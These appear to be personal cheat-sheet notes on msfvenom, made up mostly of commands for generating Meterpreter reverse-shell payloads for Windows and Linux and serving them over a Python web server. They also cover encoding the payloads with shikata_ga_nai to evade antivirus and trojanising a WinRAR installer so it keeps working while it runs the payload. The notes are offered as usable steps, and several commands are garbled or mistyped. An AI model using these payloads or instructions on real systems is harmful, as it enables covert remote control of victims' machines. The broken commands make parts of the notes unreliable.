# 🛠️ MSFVENOM
	
	
msfvenom --list 

x64 <- 64 bit 
x86 <- 32 bit



-a <- architecture

-p payload
# Windows Examples
```bash
msfvenom -a x86 -p /windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > /home/ryzen/payload64.exe

msfvenom -a x64 -p /windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > /home/ryzen/payload64.exe
```

msfvenom --list --format

elf <- binary linux file executable


elf-so <- shared object

jar <- java file

osx-app <- mac

in linux no need to mention -a arcitecture 

msfvenom -p /linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > /home/ryzen/payload32

no need to mention .elf

chmod +x payload64

msfvenom -p /linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > /home/ryzen/payload64

python3 -m http.server 8080

pythom -m SimpleHTTPServer 80

#		# ENCODEING PAYLOAD 
		
		
we can envade older AV sol by encoding our payloads

encoding is modifying payload shellcode with the objective of modifying the payload signature

msfvenom --list encoders

best <- x86/shikata_ga_nai  ploymorphic xor additive feedback encoder

msfvenom -p windows/meterpreter/reverse_tcp LHOST=   LPORT = ..... -e x86/shikata_ga_nai -f exe > payload
```bash
 output: Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
		xB6/shikata_ga_nai succeeded with size 381 (iteration=0)
		x86/shikata_ga_nai chosen with final size 381
		Payload size: 381 bytes
		Final size of exe file: 73802 bytes
```		 
  
  
  
  more interation of encode more chance of bypassing the AV
  

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT =<PORT> -i 10 -e x86/shikata_ga_nai -f exe > payload
 
 	output:
		Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
		<86/shikata_ga_nai succeeded with size 381 (iteration=0)
		<86/shikata_ga_nai succeeded with size 408 (iteration=1)
		<86/shikata_ga_nai succeeded with size 435 (iteration=2)
		<86/shikata_ga_nai succeeded with size 462 (iteration=3)
		<86/shikata_ga_nai succeeded with size 489 (iteration=4)
		<86/shikata_ga_nai succeeded with size 516 (iteration=5)
		<86/shikata_ga_nai succeeded with size 543 (iteration=6)
		86/shikata_ga_nai succeeded with size 570 (iteration=7)
		86/shikata_ga_nai succeeded with size 597 (iteration=8)
		<86/shikata_ga_nai succeeded with size 624 (iteration=9)
		<86/shikata_ga_nai chosen with final size 624
		Payload size: 624 bytes
		Final size of exe file: 73802 bytes
  
  
  same for linux
but it is much smaller than windows payloads



###		Injecting Payloads Into Windows Portable Executables 

msfvenom -x or --template for specify custom template also use -k or --keep to save behaviour and inject payload as a new thread

BEST option winRAR executable

generate 32 bin meterpreter payload then inject it in winrar setup file

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe > ~/Download/wrar32.exe > ~/payloads/winrar.exe

sudo python3 -m http.server 8080


msfconsole 
use mulit/handler
set payload window/meterpreter/reverse_tcp
 
 > run post/windows/manage/migrate
 
 why? 
 ```bash
 ->a post-exploitation module known as "migrate," which is used in a Windows environment. Essentially, this tool helps move the process that a Metasploit payload is running on into another process. And the whole idea is to dodge any interferen from Windows that might shut down that original process. So if you run this migration command, it might, for instance, hop into something like a notepad.exe process and just carry on from there. It's like a little digital shapeshifter trick to keep things running smoothly. And from there, you don’t really have to sweat the details of those modules anymore. It's all part of the fun of post-exploitation magic.
 ```
 k option 
 it mentain the original functianily of the portabel exectable and then it will execute the meterpreter payload lyeing inside the executable
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe *-k* > ~/Download/wrar32.exe > ~/payloads/winrarnew.exe 
  
  
  
  

